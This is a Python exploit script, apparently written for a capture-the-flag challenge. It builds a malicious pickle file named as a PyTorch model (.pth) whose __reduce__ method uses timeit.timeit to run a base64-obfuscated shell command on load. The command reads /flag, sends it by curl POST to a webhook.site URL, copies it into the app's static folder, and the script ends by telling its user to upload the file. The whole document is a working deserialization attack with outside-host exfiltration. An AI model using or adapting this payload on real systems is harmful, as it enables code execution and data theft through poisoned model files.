import pickle
import sys
import base64
import timeit

# CONFIGURATION
# =============
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 

# COMMAND
# =======
raw_cmd = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"
b64_cmd = base64.b64encode(raw_cmd.encode()).decode()

# The python code to execute
# timeit executes this string in a separate namespace
python_payload = f"__import__('os').system('echo {b64_cmd} | base64 -d | sh')"

print(f"[*] Payload Logic: timeit.timeit(\"{python_payload}\", number=1)")

class MaliciousModel(object):
    def __reduce__(self):
        # timeit.timeit() executes a string statement.
        # This is extremely effective because the dangerous imports happens 
        # inside the string during execution, not during unpickling.
        return (timeit.timeit, (python_payload, "pass", 1))

if __name__ == "__main__":
    output_file = "nailong_payload_v4.pth"
    with open(output_file, 'wb') as f:
        pickle.dump(MaliciousModel(), f)
    print(f"[+] Generated {output_file}")
    print("[!] Upload this file to the server.")
